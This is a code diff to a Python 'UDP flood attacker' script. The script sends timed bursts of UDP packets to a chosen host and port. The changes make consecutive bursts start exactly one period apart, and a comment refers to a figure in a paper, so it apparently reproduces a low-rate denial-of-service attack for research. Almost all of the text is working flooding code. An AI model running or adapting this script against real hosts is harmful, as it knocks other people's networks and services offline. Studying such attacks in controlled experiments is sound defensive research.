@@ -21,7 +21,7 @@ def send_burst(sock, target, burst, target_rate):
             sock.sendto(payload, (target, 5000))
             bits_sent += len(payload) * 8
         time.sleep(0.01)
- 
+
     end = time.time()
     print('  burst send done, sent %d bits at %.2f bits/sec' % (
         bits_sent, (1.0*bits_sent/(end-start))))
@@ -31,7 +31,8 @@ def main():
     parser = argparse.ArgumentParser(description='UDP flood attacker.')
     parser.add_argument(
         '--period',
-        help='Seconds between flood attack.',
+        help=('Period of the attack, T, defined as the number of seconds '
+              'between the start of consecutive attack bursts.'),
         type=float,
         required=True)
     parser.add_argument(
@@ -50,8 +51,12 @@ def main():
     data = '0' * 1024
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while True:
+        start = time.time()
         send_burst(sock, args.destination, args.burst, args.rate)
-        time.sleep(args.period)
+        end = time.time()
+
+        burst_len = end - start
+        time.sleep(args.period - burst_len)  # See Figure 3 in paper.
     sock.close()
 
 
